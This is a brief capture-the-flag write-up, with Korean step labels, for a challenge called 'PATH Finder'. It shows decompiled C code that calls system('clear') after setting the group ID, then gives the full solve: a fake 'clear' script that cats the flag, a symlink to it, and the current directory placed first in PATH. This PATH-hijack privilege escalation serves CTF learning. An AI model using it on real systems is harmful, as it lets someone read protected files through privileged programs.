### PATH Finder

#### Decompile

```c
undefined8 main(void)

{
  setresgid(0x3e9,0x3e9,0x3e9);
  system("clear");
  puts("Tada~!");
  return 0;
}
```

#### Solve

- 1. 가짜 clear를 만듦

```bash
echo '/bin/cat flag' > fake
chmod +x fake
```

- 2. 심볼릭 링크를 만든다 (ln -s 이용)

```bash
ln -s ./fake clear
```

- 3. 현재 디렉토리를 PATH의 최우선으로 설정

```bash
export PATH=./:$PATH
./chal
```
